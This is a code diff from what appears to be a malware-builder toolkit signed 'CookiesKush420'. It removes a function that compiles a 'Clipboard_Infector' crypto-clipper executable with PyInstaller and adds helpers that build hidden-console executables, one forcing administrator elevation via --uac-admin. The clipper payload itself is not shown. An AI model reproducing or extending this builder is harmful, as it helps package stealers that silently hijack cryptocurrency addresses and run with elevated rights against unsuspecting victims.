@@ -4,13 +4,13 @@ from cookies_package import *
 from time import sleep
 
 
-temp = os.getenv("TEMP")
-
-
-
 '''
 MAIN FUNCTIONS
 '''
+def temp():
+    temp = os.getenv("TEMP")
+    return temp
+
 def cleanup(filename):
     try:
         os.remove(f'{filename}.spec')
@@ -19,28 +19,11 @@ def cleanup(filename):
         shutil.rmtree('dist')
     except: pass
 
+def compile(filename):
+    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -n {filename} {filename}.py")
 
-def Create_Crypto_Clipper():
-    clear()
-    filename = "Clipboard_Infector"
-    settitle("Creating Clipboard Infector")
-    try:
-        # Add back cookies_packge obfusacation after update
-
-        print(f"{Fore.CYAN}\nCreating Clipboard Infector named {Fore.GREEN}{filename}{Fore.CYAN}.exe\n{Fore.RESET}")
-        os.system(f"pyinstaller --clean --onefile --noconsole -n {filename} {filename}.py")
-        shutil.move(f"{os.getcwd()}\\dist\\{filename}.exe", f"{os.getcwd()}\\{filename}.exe")
-
-        cleanup(filename)
-
-    except Exception as e:
-        print(f"{Fore.RED}Error while creating checker: \n\n{Fore.RESET}{e}")
-        cleanup(filename)
-        input(f"\n\n{Fore.YELLOW}Press enter to continue. . .{Fore.RESET}")
-    settitle("Clipboard Infector Created!")
-    print(f"\n{Fore.GREEN}Clipboard Infector Created{Fore.RESET}\n")
-    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.RESET}Enter anything to continue. . .  {Fore.WHITE}')
-
+def compile_forceadmin(filename):
+    os.system(f"pyinstaller --onefile --noconsole --uac-admin --clean --log-level=INFO -n {filename} {filename}.py")
 
 
 '''
@@ -57,14 +40,12 @@ def clear():
         print('\n')*120
     return
 
-
 def settitle(str):
     system = platform.system()
     if system == 'Windows':
         ctypes.windll.kernel32.SetConsoleTitleW(f"{str} | CookiesKush420#9599")
     else:
         os.system(f"\033]0;{str} | CookiesKush420#9599\a")
-
 
 def print_slow(str):
     for letter in str:
